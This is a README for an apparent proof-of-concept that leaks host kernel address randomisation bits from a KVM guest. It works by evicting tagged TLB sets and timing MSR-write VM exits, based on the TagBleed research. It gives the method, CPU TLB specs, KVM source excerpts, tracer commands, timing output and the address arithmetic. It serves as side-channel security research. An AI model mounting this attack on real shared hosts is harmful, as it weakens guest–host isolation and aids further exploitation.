# TagBleed for VMM

This is proof-of-concept code for leaking host KASLR bits from a KVM guest based on the cool research “TagBleed: Breaking KASLR on the Isolated Kernel Address Space using Tagged TLBs” by VUSec [1]. Some notes from the paper and references:

-	TLB entries are tagged using process-context identifier (PCID) to avoid flushing during context switches
-	TLB sets are indexed based on virtual address bits. Indexing function varies between microarchitecture [2]
-	It is possible to precisely evict TLB sets knowing the indexing function
-	If a kernel syscall slows down on evicting a particular TLB set (TLB miss), it is derived that the evicted TLB set stores the virtual address translation meant for some page accessed by kernel. This in turn leaks the virtual address bits thus breaking KASLR

This idea works across hypervisor boundaries as well. TLB entries are tagged with Virtual Processor IDs (VPID). The host entries are tagged to VPID 0 whereas the guest entries tagged with VPID assigned to vCPU. With VPID it is possible to avoid TLB flushing during VM entry or VM exit. Since TLB is shared between guest and host through VPID, it is possible to evict TLB sets during guest execution and measure time taken for VM exit events.

## Test Environment

**Ubuntu Host:** 18.04.4 LTS Desktop running KVM+QEMU and 5.8-rc3 kernel [4]
```
renorobert@host:~$ uname -rv
5.8.0-050800-generic #202006282330 SMP Sun Jun 28 23:35:41 UTC 2020
```
**CPU:** Intel(R) Core(TM) i7-2670QM CPU @ 2.20GHz (Sandy Bridge microarchitecture)

The PoC uses hardcoded TLB spec values for the above CPU microarchitecture. To get the TLB specifications use revanc in the host [3]

```
4-way set associative L1 d-TLB (32 entries, 2M page 4M page)
4-way set associative L1 d-TLB (64 entries, 4K page)
L1 i-TLB (8 entries, 2M page 4M page)
4-way set associative L1 i-TLB (64 entries, 4K page)
64B prefetch
4-way set associative L2 TLB (512 entries, 4K page)
8-way set associative L1 d-cache (32K, 64B line size)
8-way set associative L1 i-cache (32K, 64B line size)
8-way set associative L2 cache (256K, 64B line size)
12-way set associative L3 cache (6M, 64B line size. inclusive)
```

**Ubuntu Guest:** 20.04 LTS Server with 2 vCPUs and 4GB RAM    
```
renorobert@guest:~$ uname -rv
5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020
```
The guest is booted with “lapic=notscdeadline” kernel parameter. The PoC measures timings for VM exit caused by writing to MSR_IA32_TSC_DEADLINE which reenters guest using a fast path. Other exit events should also work e.g. CPUID, but they have longer execution time.

```c
--- arch/x86/kvm/vmx/vmx.c ---

bool __vmx_vcpu_run(struct vcpu_vmx *vmx, unsigned long *regs, bool launched);

static fastpath_t vmx_vcpu_run(struct kvm_vcpu *vcpu)
{
	fastpath_t exit_fastpath;
	struct vcpu_vmx *vmx = to_vmx(vcpu);
	unsigned long cr3, cr4;

reenter_guest:
	/* Record the guest's net vcpu time for enforced NMI injections. */
	if (unlikely(!enable_vnmi &&
		     vmx->loaded_vmcs->soft_vnmi_blocked))
		vmx->loaded_vmcs->entry_time = ktime_get(); 
	. . .
		vmx->fail = __vmx_vcpu_run(vmx, (unsigned long *)&vcpu->arch.regs,
				   vmx->loaded_vmcs->launched);
	. . .
	exit_fastpath = vmx_exit_handlers_fastpath(vcpu);
	if (exit_fastpath == EXIT_FASTPATH_REENTER_GUEST) {
		if (!kvm_vcpu_exit_request(vcpu)) {
			. . .
			if (vcpu->arch.apicv_active)
				vmx_sync_pir_to_irr(vcpu);
			goto reenter_guest;
	. . .
}
```
```c
static fastpath_t vmx_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
{
	switch (to_vmx(vcpu)->exit_reason) {
	case EXIT_REASON_MSR_WRITE:
		return handle_fastpath_set_msr_irqoff(vcpu);
	case EXIT_REASON_PREEMPTION_TIMER:
		return handle_fastpath_preemption_timer(vcpu);
	default:
		return EXIT_FASTPATH_NONE;
	}
}
```
```c
--- arch/x86/kvm/x86.c ---

fastpath_t handle_fastpath_set_msr_irqoff(struct kvm_vcpu *vcpu)
{
	u32 msr = kvm_rcx_read(vcpu);
	u64 data;
	fastpath_t ret = EXIT_FASTPATH_NONE;

	switch (msr) {
	. . .

	case MSR_IA32_TSCDEADLINE:
		data = kvm_read_edx_eax(vcpu);
		if (!handle_fastpath_set_tscdeadline(vcpu, data)) {
			kvm_skip_emulated_instruction(vcpu);
			ret = EXIT_FASTPATH_REENTER_GUEST;
		}
		break;
	. . .

	return ret;
}
```
## Experiment

Sandy Bridge uses linear indexing function for locating the TLB set [2]. For 4K pages, 7 bits from virtual address VA[12:19] is used for indexing 128 L2 TLB sets.

For kvm-intel.ko module the access to data page at address 0x3C000 and for kvm.ko module the access to data page at address 0x7A000 is noticeable across multiple executions from guest and also after host reboots. One can also evict a combination of identified TLB sets used by a kernel module to confirm the mapping.

```
renorobert@guest:~/tagbleedvmm/tlbdev$ sudo insmod tlbdev.ko

renorobert@guest:~/tagbleedvmm$ sudo ./tracer/tracer 
tracer: [+] Measuring TLB evictions across VMEXITs...
tracer: [+] Check trace_tlb.log file...

renorobert@analysis:~/tagbleedvmm$ python scripts/tlb_evict_solver.py results/trace_tlb.log
Set: 0x32, Time: 5104
Set: 0x42, Time: 5099
Set: 0x37, Time: 5086
Set: 0x0c, Time: 5062
Set: 0x3d, Time: 5037
Set: 0x33, Time: 4986
Set: 0x4c, Time: 4964
Set: 0x13, Time: 4959
Set: 0x18, Time: 4959
Set: 0x15, Time: 4959
Set: 0x1c, Time: 4959
Set: 0x74, Time: 4959
Set: 0x12, Time: 4959
Set: 0x11, Time: 4959
Set: 0x0f, Time: 4959
Set: 0x1b, Time: 4959
Set: 0x75, Time: 4959
```
```
renorobert@host:~$ sudo cat /proc/modules | grep -i kvm
kvm_intel 286720 4 - Live 0xffffffffc04f6000
kvm 708608 1 kvm_intel, Live 0xffffffffc0448000

>>> hex(((0xffffffffc04f6000 + 0x3c000) & 0x7f000) >> 12)
'0x32L'
>>> hex(((0xffffffffc0448000 + 0x7a000) & 0x7f000) >> 12)
'0x42L'
```
![alt text](https://github.com/renorobert/tagbleedvmm/raw/master/results/trace_tlb.png "tagbleedvmm")
 
## References

[1] TagBleed: Breaking KASLR on the Isolated Kernel Address Space using Tagged TLBs
https://download.vusec.net/papers/tagbleed_eurosp20.pdf

[2] Translation Leak-aside Buffer: Defeating Cache Side-channel Protections with TLB Attacks
https://download.vusec.net/papers/tlbleed_sec18.pdf

[3] RevAnC: A Framework for Reverse Engineering Hardware Page Table Caches
https://download.vusec.net/papers/revanc_eurosec17.pdf     
https://github.com/vusec/revanc

[4] Ubuntu kernel v5.8-rc3 Mainline Test    
https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8-rc3/


